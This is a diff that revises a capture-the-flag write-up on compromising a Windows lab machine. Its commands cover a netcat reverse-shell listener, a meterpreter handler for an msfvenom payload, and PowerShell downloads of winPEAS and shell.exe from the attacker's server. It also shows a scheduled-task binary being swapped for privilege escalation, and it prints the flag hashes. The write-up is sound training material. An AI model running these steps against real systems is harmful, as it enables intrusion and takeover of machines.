@@ -341,6 +341,7 @@ From the exploit itself basic instruction:
   	  
 - Next save, then selec "GO TO POST" this should activate the reverse shell back to the listener started earlier. Then trigger exploit using the 'theme' address component on IP of target.
 - Then have a look at current suer with whoami
+
 ## Q3 Who is the webserver running as? Determined with whoami command at prompt
 ```
 root@<attackbox>:~# nc -lp 4445
@@ -370,7 +371,7 @@ c:\Windows\Temp>dir shell.*
 04/19/2026  12:41 PM            73,802 shell.exe
 ```
 
-\Start metasploit console and prepare a listener for the exploit (must be windows/meterpreter/reverse_tcp same as msfvenom payload):
+Start metasploit console and prepare a listener for the exploit (must be windows/meterpreter/reverse_tcp same as msfvenom payload):
 ```
 msf6 > use exploit/multi/handler
 msf6 exploit(multi/handler) > set LHOST <AttackBoxIP>
@@ -388,8 +389,9 @@ root@ip-<AttackBoxIP>:/opt/PEAS/winPEAS/winPEASbat# python3 -m http.server 6000
 Serving HTTP on 0.0.0.0 port 6000 (http://0.0.0.0:6000/) ...
 <targetIP> - - [19/Apr/2026 21:13:24] "GET /winPEAS.bat HTTP/1.1" 200 -
 ```
+File obtained similarly to before with Invoke-WebRequest:
 ```
-powershell -c "Invoke-WebRequest -Uri 'http://10.145.67.108:6000/winPEAS.bat' -Outfile 'c:\windows\temp\winPEAS.bat'
+powershell -c "Invoke-WebRequest -Uri 'http://<AttackBoxIP>:6000/winPEAS.bat' -Outfile 'c:\windows\temp\winPEAS.bat'
 ```
 
 Output when winPEAS is run will run off the screen so save to file from the directory its uploaded to:
@@ -466,7 +468,7 @@ Mode          Size   Type  Last modified          Name
 100666/rw-rw  0      fil   2026-04-20 19:45:20 +  service.flg
 -rw-                       0100
 ```
-Here quick looks shows that 20198415519.INI_LOG.txt is of interest with message.exe running every 30 seconds.
+Here quick looks shows that 20198415519.INI_LOG.txt is of interest with message.exe running every minute.
 ```
 meterpreter > head 20198415519.INI_LOG.txt 
 04/20/26 11:43:02,Event Started Ok, (Administrator)
@@ -489,17 +491,18 @@ Next replace the message.exe file with the shell.exe previously used:
 - rename shell.exe message.exe
 - Then let message run from scheduled task by backgrounding meterpreter shell and restarting the listener to allow it to reconnect from this new files location.
 
-- Two ways to run the powershell command one is:
+## Two ways to run the powershell command one is:
+```
 meterpreter> shell
 c:\Program Files (x86)\systemscheduler\> powershell -c "Invoke-WebRequest -Uri 'http://10.146.85.223:8000/shell.exe' -Outfile 'c:\program files (x86)\systemscheduler\events\shell.exe'
-
-or first run to get powershell prompt: 
+```
+Or first load powershell to get powershell prompt: 
 ```
 meterpreter > load powershell
 Loading extension powershell...Success.
 meterpreter > powershell_shell
+PS>
 ```
-Then enter powershell commands from powershell prompt.
 
 Since the previous one already done I used powershell method instead.
 ```
@@ -512,14 +515,12 @@ PS > dir mes*
 Mode                LastWriteTime     Length Name
 ----                -------------     ------ ----
 -a---         3/25/2018  10:58 AM     536992 Message.exe
-
+...
 PS > ren message.exe message.bak
 PS > dir mes*
-    Directory: C:\program files (x86)\SystemScheduler
-Mode                LastWriteTime     Length Name
-----                -------------     ------ ----
+...
 -a---         3/25/2018  10:58 AM     536992 message.bak
-
+...
 PS > Invoke-WebRequest -Uri 'http://10.65.115.87:8000/shell.exe' -Outfile 'c:\program files (x86)\systemscheduler\message.exe'
 PS > dir mes* 
     Directory: C:\program files (x86)\SystemScheduler
@@ -549,7 +550,7 @@ echo %username%
 Administrator
 ```
 
-Move to jeffs Desktop to find flag
+Move to jeffs Desktop to find flag:
 ```
 c:\Users>dir
 ...
@@ -558,33 +559,24 @@ c:\Users>dir
 08/05/2019  02:03 PM    <DIR>          Administrator
 08/04/2019  11:54 AM    <DIR>          jeff
 08/22/2013  08:39 AM    <DIR>          Public
-               0 File(s)              0 bytes
-               7 Dir(s)  38,985,801,728 bytes free
-
+...
 c:\Users\jeff\Desktop>dir
-dir
 ...
 08/04/2019  11:57 AM                32 user.txt
-               1 File(s)             32 bytes
-               2 Dir(s)  38,985,801,728 bytes free
-
+...
 c:\Users\jeff\Desktop>type user.txt
 type user.txt
 759bd8af507517bcfaede78a21a73e39
 ```
 Same for Administrator flag:
 ```
-c:\Users\jeff\Desktop>cd "c:\users\Administrator\Desktop"
 c:\Users\Administrator\Desktop>dir
 ...
 08/04/2019  11:51 AM                32 root.txt
-08/04/2019  04:36 AM             1,029 System Scheduler.lnk
-               2 File(s)          1,061 bytes
-               2 Dir(s)  38,985,801,728 bytes free
-
+...
 c:\Users\Administrator\Desktop>type root.txt
 type root.txt
 7e13d97f05f7ceb9881a3eb3d78d3e72
 ```
-```
 
+# Task 5
